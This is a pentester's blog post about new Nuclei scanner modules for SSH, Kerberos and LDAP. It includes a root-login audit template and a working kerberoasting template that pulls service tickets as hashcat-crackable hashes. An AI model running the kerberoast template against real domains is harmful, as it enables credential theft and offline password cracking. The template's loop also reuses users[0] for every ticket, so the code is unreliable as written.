---
image: /assets/img/nuclei_image.png
categories:
  - dev
  - research
  - ad
---
[Nuclei](https://github.com/projectdiscovery/nuclei) automates security assessments. Give it a yaml _template_ and it will spit out an answer telling you if the vulnerability defined in the template was found on the scope you selected. **Nuclei is as good as the templates that runs**.

> (Nuclei is a) fast and customisable vulnerability scanner based on simple YAML based DSL.

At the time of writing, there are many templates aiming to identify many CVEs and many generic known and unknown vulnerabilities, but version 3 of nuclei brought us "the javascript protocol".

> Some network exploits are very complex to write due to nature of the protocol or exploit itself. [...] Detection for these exploits is usually written in Python but now can be written in JavaScript.

The [javascript protocol](https://docs.projectdiscovery.io/templates/protocols/javascript/introduction) allows the user to write templates using a javascript-like syntax, but taking advantage of exported functions from Go code:

```javascript
let m = require('nuclei/ssh');
let c = m.SSHClient();
let state = c.Connect('localhost', 22, 'user', 'password');
let result = c.Close();
```

## Very cool, why are you telling me this?

[I got carried on recently](https://github.com/projectdiscovery/nuclei/commits?author=5amu) by the possibilities of this new approach and made changes to 3 of the modules exposed by the javascript protocol:

1. SSH ([#4407](https://github.com/projectdiscovery/nuclei/pull/4407))
2. Kerberos ([#4420](https://github.com/projectdiscovery/nuclei/pull/4420), [#4422](https://github.com/projectdiscovery/nuclei/pull/4422), [#4647](https://github.com/projectdiscovery/nuclei/pull/4647))
3. LDAP ([#4667](https://github.com/projectdiscovery/nuclei/pull/4667))

But wait, this article is not just a flex 😉, I will give you (useful) information on what can be done and leave with 2 templates that you can use in your environment!
### About the SSH module

The change I made in the module is simple, yet effective: it allows you to execute code over an SSH connection. This can be used to run local checks on remote machines, which is something that a security professional usually does running linpeas, linenum and whatnot...

Imagine having a good set of templates and running them on 10, 100 or even 1000 IP addresses to find the same vulnerability on multiple hosts:

```yaml
id: permit-root-login

info:
    name: "Permit Root Login SSH"
    author: 5amu
    severity: high

javascript:
    - args:
        SSHServer: "{{Host}}"
        Path: "{{path}}"

      threads: 1    
      payloads:
        path:
          - "/etc/ssh/sshd_config"

      code: |
        var ssh = require("nuclei/ssh");
        var c = ssh.SSHClient();
        
        c.Connect(SSHServer, Port, template.Username, template.Password)
        c.Run("grep '^PermitRootLogin yes' " + Path)

      stop-at-first-match: true
      matchers:
        - type: dsl
          name: ""
          dsl:
            - "success == true"
```
This is a simple template to find *nix machines where the root account can login via password authentication using ssh!
![](assets/img/example-ssh.png)
### About the Kerberos module

The changes introduced into the kerberos module allow the templates to request service tickets when talking to a domain controller, the improvements concern dependencies' optimizations too. The syntax to get a service ticket (formatted for hashcat) is very simple:

```javascript
var krb = require("nuclei/kerberos");
var client = krb.Client(template.Domain, DomainController);
var tgs = client.GetServiceTicket(template.Username, template.Password, users[0].ServicePrincipalName[0]);

// tgs.Hash contains the string crackable with hashcat :)
```

For the most curious of you, the way in which is formatted is the following:

```go
func TGStoHashcat(tgs messages.Ticket, username string) (string, error) {
	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		tgs.EncPart.EType,
		username,
		tgs.Realm,
		strings.Join(tgs.SName.NameString[:], "/"),
		hex.EncodeToString(tgs.EncPart.Cipher[:16]),
		hex.EncodeToString(tgs.EncPart.Cipher[16:]),
	), nil
}
```

### About the LDAP module

Here there are the most contributions... This is the [full list](https://github.com/projectdiscovery/nuclei/pull/4667) of features I implemented:

![](assets/img/full-list-ldap.png)
Basically this allows a template to connect to an ldap server and query using whatever filter and getting whatever attribute, but I also added some "utility" methods to retrieve specific stuff from active directory, such as:

```go
// ADObject represents an Active Directory object
type ADObject struct {
	DistinguishedName    string
	SAMAccountName       string
	PWDLastSet           string
	LastLogon            string
	MemberOf             []string
	ServicePrincipalName []string
}


// FindADObjects finds AD objects based on a filter
// and returns them as a list of ADObject
FindADObjects(filter string) []ADObject

func GetADUsers() []ADObject
func GetADActiveUsers() []ADObject
func GetADUserWithNeverExpiringPasswords() []ADObject
func GetADUserTrustedForDelegation() []ADObject
func GetADUserWithPasswordNotRequired() []ADObject
func GetADGroups() []ADObject
func GetADDCList() []ADObject
func GetADAdmins() []ADObject
func GetADUserKerberoastable() []ADObject
func GetADDomainSID() string
```

These methods can be used in conjunction with the kerberos module to perform more complex attacks, such as kerberoasting (example in next chapter) and the generic method:

```go
// Search accepts whatever filter and returns a list of maps having provided attributes
// as keys and associated values mirroring the ones returned by ldap
// Signature: Search(filter, attributes...)
func Search(filter string, attributes ...string) []map[string][]string
```

Allows the template to define its own filter and request whatever attribute it desires.

### The kerberoast template

As promised, this is the nuclei template to perform a (almost) complete kerberoast attack without leaving nuclei:

```yaml
id: kerberoast

info:
  name: Kerberoast
  author: 5amu
  severity: info

javascript:
  - args:
      DomainController: "{{Host}}"

    code: |
      var ldap  = require("nuclei/ldap");
      var lc    = ldap.Client("ldap://" + DomainController + ":389", template.Domain);
      
      lc.Authenticate(template.Username, template.Password)
      var users = lc.GetADUserKerberoastable();

      var krb = require("nuclei/kerberos");
      var client = krb.Client(template.Domain, DomainController);

      var tickets = [];
      for (let i=0; i<users.length; i++) {
        var t = client.GetServiceTicket(template.Username, template.Password, users[0].ServicePrincipalName[0]);
        tickets.push({
          "Name": users[i].SAMAccountName, 
          "Hash": t.Hash,
        });
      }
      to_json(tickets);

    extractors:
      - type: json
        json:
          - '.[] | "\(.Name) => \(.Hash)"'
```

![](assets/img/example-kerberoast.png)
## Closing Thoughts

The future in which will be possible to automate the **most common** attacks on active directory is near, the technical knowledge required to get into this world (ad pentesting) will decrease even more over time. Companies (hopefully) will implement all measures to cut off these low hanging vulnerabilities and the exploit complexity will spike, but for now there is still time to play 😊.